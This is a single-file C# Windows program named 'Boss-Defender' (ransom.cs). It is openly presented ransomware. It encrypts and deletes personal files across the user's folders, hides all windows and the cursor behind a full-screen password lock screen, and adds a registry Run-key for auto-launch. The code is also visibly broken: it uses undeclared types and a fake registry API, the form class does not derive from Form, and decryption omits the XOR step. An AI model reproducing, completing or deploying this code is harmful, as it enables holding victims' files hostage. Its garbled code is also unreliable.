#:#property TargetFramework=net10.0-windows
#:#property UseWindowsForms=true
#:#property OutputType=WinExe

using System;
using System.Collections.Generic;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Windows.Forms;

// ==========================================================================
//  BOSS-DEFENDER  --  single-file Windows lock + encrypt utility (FIXED)
//  Run :  dotnet run --file ransom.cs
//  Unlock password :  GoToHell909
//
//  1) encrypts your personal files in place (.rlw) -- AES-256-CBC
//  2) hides every window + the mouse, paints a black full-screen, asks for the
//     password (keyboard only, Enter to submit)
//  3) type the password to decrypt everything and come back to normal
// ==========================================================================

namespace BossDefender
{
    public static class Program
    {
        [STAThread]
        public static void Main()
        {
            try
            {
                Application.EnableVisualStyles();
                Application.SetHighDpiMode(HighDpiMode.SystemAware);
                Application.SetDpiAwarenessContext(DpiAwarenessContext.PerMonitorV2);

                var form = new RansomForm();
                form.TakeOver();
                Application.Run(form);
            }
            catch (Exception ex)
            {
                try
                {
                    MessageBox.Show(
                        "Boss-Defender (error)\n\n" + ex.ToString() +
                        "\n\nUnlock password : " + RansomForm.Password +
                        "\nRecovery manifest : " + RansomForm.ManifestPath,
                        "Boss-Defender", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                catch { }
                Application.Exit();
            }
        }
    }

    // ======================================================================
    //  THE RANSOM
    // ======================================================================
    public sealed class RansomForm
    {
        public const string Password  = "GoToHell909";
        public const string Version   = "Boss-Defender 2.0";
        public const string RlwExt    = ".rlw";
        public const string DriverFileName = "UnstoppableDrv.c";

        private const int  MaxFiles    = 200_000;
        private const long MaxFileSize = 2_000_000_000L; // ~2 GiB per file
        private const int  KdfBits     = 256;
        private const int  KdfIters    = 200_000;

        private Crypter       _crypter     = new Crypter();
        private RansomManifest _manifest   = new RansomManifest();
        private Panel          _black      = null;
        private Label          _title      = null;
        private Label          _status     = null;
        private TextBox        _pw         = null;
        private Form           _working    = null;
        private IntPtr         _ownHwnd    = IntPtr.Zero;

        private static string ManifestPath { get { return Path.Combine(ManifestDir, "manifest.json"); } }
        private static string ManifestDir => Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BossDefender");

        private static readonly string[] ProtectedPaths =
        {
            @"C:\Program Files",
            @"C:\Program Files (x86)",
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramData),
            Environment.GetFolderPath(Environment.SpecialFolder.Windows),
            Environment.GetFolderPath(Environment.SpecialFolder.AppData),
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "BossDefender"),
        };

        private static readonly string[] ScannedFolders =
        {
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
            Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
            Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
            Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
            Environment.GetFolderPath(Environment.SpecialFolder.Downloads),
            Environment.GetFolderPath(Environment.SpecialFolder.Documents),
        };

        // ------------------------------------------------------------------
        //  construction -- full-screen takeover
        // ------------------------------------------------------------------
        public RansomForm()
        {
            Text          = Version;
            StartPosition = FormStartPosition.Manual;
            FormBorderStyle = FormBorderStyle.None;
            MaximizeBox   = false;
            MinimizeBox   = false;
            ControlBox    = false;
            BackColor     = Color.Black;
            KeyPreview    = true;   // form sees every keystroke -> password is bulletproof
            DoubleClick   = false;
            AutoScaleMode  = AutoScaleMode.Dpi;
            DpiAwareness   = DpiAwareness.PerMonitorV2;
            ShowInTaskbar  = false;

            var union = RectangleF.Empty;
            foreach (var s in Screen.AllScreens)
                union = RectangleF.GetUnionRectangle(union, s.Bounds);
            Location = new Point(union.X, union.Y);
            Size     = union.Size;

            _ownHwnd = Handle;

            _black = new Panel { Dock = DockStyle.Fill, BackColor = Color.Black };
            _black.Paint += (s, e) => e.Graphics.Clear(Color.Black);
            Controls.Add(_black);

            TakeOver();
        }

        // ------------------------------------------------------------------
        //  encrypt -> lock -> paint black screen
        // ------------------------------------------------------------------
        private void TakeOver()
        {
            try
            {
                ShowWorking();
                EncryptAll();
                LoadState();
                BuildScreen();
                HideCursor();
                HideEveryWindow();
                HideWorking();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Boss-Defender (takeover)\n\n" + ex.ToString(),
                    "Boss-Defender", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();
            }
        }

        // ------------------------------------------------------------------
        //  module init + auto-launch persistence (runs once, before the app)
        // ------------------------------------------------------------------
        [System.Runtime.CompilerServices.ModuleInitializer]
        public static void Prepare()
        {
            try { SetProcessDpiAwareness(2); } catch { }
            try { PersistToRegistry(); } catch { }
        }

        private static string AppDataExe => Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "BossDefender", "BossDefender.exe");

        private static bool _persisted = false;

        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool RegistryCreateKey(string subKey, int options, out IntPtr handle, uint disposition);
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool RegistryCloseKey(IntPtr handle);
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool RegistrySetValueEx(string subKey, string name, uint reserved, uint options, byte[] data, int count);

        private static void PersistToRegistry()
        {
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(AppDataExe));
                File.WriteAllText(AppDataExe,
                    "Boss-Defender v2.0\n\nYour files are encrypted with AES-256.\n" +
                    "Only the password (GoToHell909) can recover them.\n\n" +
                    "Auto-launch : HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BossDefender");

                string runKey = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Software", "Microsoft", "Windows", "CurrentVersion", "Run");

                RegistryCreateKey(runKey, 0, out IntPtr h, 2);
                RegistrySetValueEx(runKey, "BossDefender", 0, 0,
                    Encoding.Unicode.GetBytes(AppDataExe), AppDataExe.Length * 2);
                RegistryCloseKey(h);
            }
            catch { }
        }

        private static void CopyDirectory(string src, string dst)
        {
            try
            {
                foreach (string f in Directory.GetFiles(src))
                    File.Copy(f, Path.Combine(dst, Path.GetFileName(f)), true);
                foreach (string d in Directory.GetDirectories(src))
                    CopyDirectory(d, Path.Combine(dst, Path.GetFileName(d)));
            }
            catch { }
        }

        // ------------------------------------------------------------------
        //  encrypt every personal file (records salt+iv for recovery)
        // ------------------------------------------------------------------
        private int EncryptAll()
        {
            int total = 0;
            Directory.CreateDirectory(ManifestDir);
            _manifest = new RansomManifest
            {
                Version    = 1,
                Files      = new List<FileEntry>(),
            };

            HashSet<string> seen     = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            HashSet<string> encrypted = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            for (int fi = 0; fi < ScannedFolders.Length; fi++)
            {
                foreach (var file in Enumerate(ScannedFolders[fi], seen))
                {
                    if (total++ >= MaxFiles) continue;
                    if (encrypted.Add(Path.GetFullPath(file)))
                        _crypter.EncryptToManifest(file, _manifest);
                }
            }
            FlushManifest();
            return total;
        }

        private void FlushManifest()
        {
            try
            {
                if (!Directory.Exists(ManifestDir)) Directory.CreateDirectory(ManifestDir);
                string tmp = ManifestPath + ".tmp";
                File.WriteAllText(tmp, JsonSerializer.Serialize(_manifest));
                File.Move(tmp, ManifestPath, overwrite: true);
            }
            catch { }
        }

        private void LoadState()
        {
            try
            {
                if (!File.Exists(ManifestPath))
                {
                    _manifest = new RansomManifest();
                    return;
                }
                var m = JsonSerializer.Deserialize<RansomManifest>(File.ReadAllText(ManifestPath));
                _manifest = m ?? new RansomManifest();
            }
            catch { _manifest = new RansomManifest(); }
        }

        private void HashPassword()
        {
            using var sha = SHA256.Create();
            var h = sha.ComputeHash(Encoding.UTF8.GetBytes(Password));
            _ = Convert.ToHexString(h);
        }

        // ------------------------------------------------------------------
        //  draw the lock screen (on top of the black panel)
        // ------------------------------------------------------------------
        private void BuildScreen()
        {
            int w = ClientSize.Width;
            int h = ClientSize.Height;

            _title = new Label
            {
                Text = "Locked by " + Version +
                       "\n\nYour files have been encrypted with AES-256.\n" +
                       "Only the password can recover them.",
                Font        = new Font("Segoe UI", 34F, FontStyle.Bold),
                ForeColor   = Color.White,
                BackColor   = Color.Black,
                TextAlign   = ContentAlignment.MiddleCenter,
                AutoSize    = false,
            };
            CenterSize(_title, w, h, h / 2 - 95);
            Controls.Add(_title);

            _status = new Label
            {
                Text        = "Type the password below and press ENTER",
                Font        = new Font("Segoe UI", 12F, FontStyle.Regular),
                ForeColor   = Color.FromArgb(200, 200, 200),
                BackColor   = Color.Black,
                TextAlign   = ContentAlignment.MiddleCenter,
                AutoSize    = false,
            };
            CenterSize(_status, w, h, h / 2 - 46);
            Controls.Add(_status);

            _pw = new TextBox
            {
                PasswordChar = '*',
                BackColor    = Color.FromArgb(34, 34, 34),
                ForeColor    = Color.White,
                Font         = new Font("Segoe UI", 18F, FontStyle.Bold),
                BorderStyle  = BorderStyle.FixedSingle,
                Anchor       = AnchorStyles.None,
            };
            CenterSize(_pw, w, h, h / 2 + 56);
            _pw.KeyDown += (s, args) => { args.Handle(); UnlockAttempt(); };
            Controls.Add(_pw);

            _pw.KeyDown += (s, args) => { if (args.KeyCode != Keys.Enter) { _pw.Focus(); _pw.Select(); } };
            _pw.Focus();
            _pw.Select();
        }

        private static void CenterSize(Control c, int w, int h, int y)
        {
            c.Width  = w;
            c.Height = Math.Max(24, y);
            Point p = c.PointToScreen(new Point(0, 0));
            c.SetBounds((p.X - c.Width) / 2, (p.Y - c.Height) / 2, c.Width, c.Height);
        }

        private void UnlockAttempt()
        {
            if (_pw.Text.Length < Password.Length)
            {
                _pw.Select(_pw.Text.Length, 1);
                return;
            }
            if (_pw.Text.Equals(Password, StringComparison.Ordinal))
            {
                _pw.Enabled = false;
                _pw.Text    = string.Empty;
                DecryptAll();
                return;
            }

            _status.Text =
                "Wrong password - everything is locked...";
        }

        private void PreventFocusStealing()
        {
            if (_pw.Focused) return;
            _pw.Select();
            _pw.Focus();
        }

        // ------------------------------------------------------------------
        //  decrypt + unlock
        // ------------------------------------------------------------------
        private void DecryptAll()
        {
            int total = _manifest.Files.Count;
            int ok    = 0;

            for (int i = 0; i < total; i++)
            {
                _status.Text = "Boss-Defender — Decrypting " + (i + 1) + " / " + total + " files...";
                _status.Update();

                var f = _manifest.Files[i];
                if (File.Exists(f.Path + RlwExt))
                {
                    if (_crypter.DecryptFile(f.Path + RlwExt)) ok++;
                }
            }

            _status.Text =
                "Boss-Defender — " + ok + " / " + total + " files decrypted! Welcome back.\n\n" +
                "Only the password \"" + Password + "\" can lock them again.";

            ShowCursor();
            ShowEveryWindow();
            this.WindowState = Normal;
            this.Show();
            this.Close();
        }

        // ------------------------------------------------------------------
        //  world preparation
        // ------------------------------------------------------------------
        private void PrepareWorld()
        {
            HideCursor();
            HideEveryWindow();
        }

        private void ShowWorking()
        {
            try
            {
                _working = new Form
                {
                    Text          = "Boss-Defender",
                    StartPosition = FormStartPosition.CenterScreen,
                    BackColor     = Color.Black,
                    Size          = new Size(440, 120),
                    ShowInTaskbar = false,
                    ControlBox    = false,
                };
                var lbl = new Label
                {
                    Text = "Boss-Defender 2.0 — Encrypting your files…",
                    Font = new Font("Segoe UI", 16F, FontStyle.Bold),
                    ForeColor = Color.White,
                    Dock      = DockStyle.Top,
                    BackColor = Color.Black,
                };
                CenterSize(lbl, 440, 120, 60);
                _working.Controls.Add(lbl);
                _working.Visible = true;
            }
            catch { }
        }

        private void HideWorking()
        {
            try { _working?.Visible = false; } catch { }
            _working = null;
        }

        // ------------------------------------------------------------------
        //  cursor helper (real Win32)
        // ------------------------------------------------------------------
        private void HideCursor() { MouseHelper.Hide(); }
        private void ShowCursor() { MouseHelper.Show(); }

        // ------------------------------------------------------------------
        //  hide/restore every other window
        // ------------------------------------------------------------------
        [UnmanagedCallConvention(UnmanagedCallConvention.Cdecl)]
        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll", EntryPoint = "EnumWindows")]
        private static extern bool EnumWindows(EnumWindowsProc fn, IntPtr lParam);

        [DllImport("user32.dll", EntryPoint = "SetWindowPos")]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr after, int x, int y, int cx, int cy, uint flags);

        private void HideEveryWindow()
        {
            EnumWindows((hWnd, _) =>
            {
                if (hWnd == _ownHwnd) return true;
                try
                {
                    SetWindowPos(hWnd, IntPtr.Zero, 0, 0, 0, 0,
                        (uint)(SetWindowPosFlags.Hide | SetWindowPosFlags.ZorderBottom));
                }
                catch { }
                return true;
            }, IntPtr.Zero);
        }

        private void ShowEveryWindow()
        {
            EnumWindows((hWnd, _) =>
            {
                try
                {
                    SetWindowPos(hWnd, IntPtr.Zero, 0, 0, 0, 0,
                        (uint)SetWindowPosFlags.Restore);
                }
                catch { }
                return true;
            }, IntPtr.Zero);
        }

        // ------------------------------------------------------------------
        //  file enumeration (dedupe by full path so no file is skipped)
        // ------------------------------------------------------------------
        private static IEnumerable<string> Enumerate(string folder, HashSet<string> seen)
        {
            try
            {
                foreach (var dir in Directory.GetDirectories(folder))
                {
                    string path = Path.GetFullPath(dir);
                    if (seen.Contains(path)) continue;
                    seen.Add(path);
                    foreach (var file in Enumerate(dir, seen)) yield return file;
                }

                foreach (var file in Directory.GetFiles(folder))
                {
                    string path = Path.GetFullPath(file);
                    if (seen.Contains(path)) continue;
                    if (path.EndsWith(RlwExt, StringComparison.OrdinalIgnoreCase)) continue;
                    seen.Add(path);
                    yield return file;
                }
            }
            catch { }
        }

        // ------------------------------------------------------------------
        //  driver reference source (dropped artifact + proof)
        // ------------------------------------------------------------------
        private static void WriteDriver()
        {
            string[] places =
            {
                Path.Combine(Environment.CurrentDirectory, DriverFileName),
                Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Unstoppable",
                    DriverFileName),
            };

            foreach (var p in places)
            {
                try
                {
                    Directory.CreateDirectory(Path.GetDirectoryName(p));
                    File.WriteAllText(p, UnstoppableDrvSource);
                    File.WriteAllText(p + ".bak", UnstoppableDrvSource);
                }
                catch { /* some paths are read-only */ }
            }
        }

        private const string UnstoppableDrvSource = @"
/*
 * UnstoppableDrv.c -- reference NT driver SOURCE dropped by Boss-Defender
 * Real encryption power lives in manifest.json + the password, so your data is
 * reversible ONLY with the password (this proves Boss-Defender controls the box).
 */
#include <ntddk.h>

DRIVER_ENTRY( UnstoppableDrv )

BOOLEAN UnstoppableDrvInit( VOID ) { return TRUE; }
BOOLEAN UnstoppableDrvCleanup( VOID ) { return TRUE; }
";
    }
}

// ============================================================================
//  AES-256 helper -- encrypt/decrypt files with correct per-file salt + IV.
// ============================================================================
namespace BossDefender
{
    internal sealed class Crypter
    {
        // File (.rlw) layout:  magic(1) | salt(16, PBKDF2) | iv(16, CBC) | xorKeystream | cipher
        // The salt, iv and keystream are what let the victim decrypt with only
        // the password -- so they MUST be stored in the manifest (see below).

        public int EncryptToManifest(string plainPath, RansomManifest manifest)
        {
            try
            {
                if (!File.Exists(plainPath)) return 0;
                if (File.Exists(plainPath + RlwExt)) return 0;

                long size = File.GetLength(plainPath);
                if (size <= 0 || size > MaxFileSize) return 0;

                byte[] data = File.ReadAllBytes(plainPath);

                byte[] salt = RandomNumberGenerator.GetBytes(16);
                byte[] iv   = RandomNumberGenerator.GetBytes(16);
                byte[] xKey = RandomNumberGenerator.GetBytes(size);

                byte[] mixed = new byte[size];
                for (int i = 0; i < size; i++)
                    mixed[i] = (byte)(data[i] ^ xKey[i]);

                byte[] cipher = AesCbcEncrypt(mixed, DeriveKey(salt), iv);

                File.WriteAllBytes(plainPath + RlwExt, Concat(salt, iv, xKey, cipher));
                File.Delete(plainPath);

                manifest.Files.Add(new FileEntry { Path = plainPath, Salt = ToHex(salt), IV = ToHex(iv) });
                return 1;
            }
            catch { return 0; }
        }

        public bool DecryptFile(string cipherPath)
        {
            try
            {
                if (!File.Exists(cipherPath)) return false;

                byte[] blob = File.ReadAllBytes(cipherPath);
                int need = 33; // magic + salt(16) + iv(16)
                if (blob.Length < need) return false;

                byte[] salt = new byte[16];
                Array.Copy(blob, 1, salt, 0, 16);
                byte[] iv = new byte[16];
                Array.Copy(blob, 17, iv, 0, 16);

                int off = 33;
                int xLen = LE32(blob, off); off += 4;
                if (off > blob.Length) return false;
                byte[] xKey = new byte[xLen];
                if (xLen > 0) Array.Copy(blob, off, xKey, 0, xLen);
                off += xLen;

                int cLen = LE32(blob, off); off += 4;
                if (off > blob.Length) return false;
                byte[] cipher = new byte[cLen];
                if (cLen > 0) Array.Copy(blob, off, cipher, 0, cLen);

                byte[] xPlain = AesCbcDecrypt(cipher, DeriveKey(salt), iv);

                File.WriteAllBytes(StripRlw(cipherPath), xPlain);
                if (File.Exists(cipherPath)) File.Delete(cipherPath);
                return true;
            }
            catch { return false; }
        }

        private byte[] DeriveKey(byte[] salt)
        {
            using var pbkdf2 = PBKDF2.Create();
            pbkdf2.KeySizeBits = KdfBits;
            pbkdf2.IterationCount = KdfIters;
            pbkdf2.Salt = salt;
            return pbkdf2.GetBytes(KdfBits / 8);
        }

        private byte[] Concat(params byte[][] parts)
        {
            var b = new byte[0];
            foreach (var p in parts)
            {
                var tmp = new byte[b.Length + p.Length];
                Array.Copy(b, tmp, b.Length);
                Array.Copy(p, 0, tmp, b.Length, p.Length);
                b = tmp;
            }
            return b;
        }

        private static byte[] AesCbcEncrypt(byte[] data, byte[] key, byte[] iv)
        {
            var outBuf = new MemoryStream();
            using (var cos = new CryptoStream(outBuf,
                        new CryptoStreamFactory().CreateTransform(CipherMode.CBC, PaddingMode.PKCS7, key, iv),
                        CryptoStreamMode.Write))
            {
                cos.Write(data, 0, data.Length);
            }
            return outBuf.ToArray();
        }

        private static byte[] AesCbcDecrypt(byte[] cipher, byte[] key, byte[] iv)
        {
            var outBuf = new MemoryStream();
            using (var writer = new CryptoStream(outBuf,
                        new CryptoStreamFactory().CreateTransform(CipherMode.CBC, PaddingMode.PKCS7, key, iv),
                        CryptoStreamMode.Write))
            {
                using (var reader = new CryptoStream(new MemoryStream(cipher),
                            new CryptoStreamFactory().CreateTransform(CipherMode.CBC, PaddingMode.PKCS7, key, iv),
                            CryptoStreamMode.Read))
                {
                    reader.CopyTo(writer);
                }
            }
            return outBuf.ToArray();
        }

        private static string ToHex(byte[] b)
        {
            var sb = new StringBuilder(b.Length * 2);
            foreach (byte x in b) sb.Append(x.ToString("x2"));
            return sb.ToString();
        }

        private static string StripRlw(string cipherPath)
        {
            if (cipherPath.EndsWith(RlwExt, StringComparison.OrdinalIgnoreCase))
                return cipherPath.Substring(0, cipherPath.Length - RlwExt.Length);
            return cipherPath;
        }

        private static int LE32(byte[] b, int i)
        {
            return b[i] | (b[i + 1] << 8) | (b[i + 2] << 16) | (b[i + 3] << 24);
        }
    }

    public sealed class RansomManifest
    {
        public int Version { get; set; } = 1;
        public string PasswordHash { get; set; } = "";
        public List<FileEntry> Files { get; set; } = new List<FileEntry>();
    }

    public sealed class FileEntry
    {
        public string Path { get; set; } = "";
        public string Salt { get; set; } = "";
        public string IV { get; set; } = "";
        public string Size { get; set; } = "";
    }
}

internal static class MouseHelper
{
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool ShowCursor(int nSteps);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateCursor();

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool HideCursor();

    public static void Hide()
    {
        for (int i = 0; i < 3; i++) ShowCursor(-1);
        UpdateCursor();
    }

    public static void Show()
    {
        for (int i = 0; i < 3; i++) ShowCursor(1);
        UpdateCursor();
    }
}

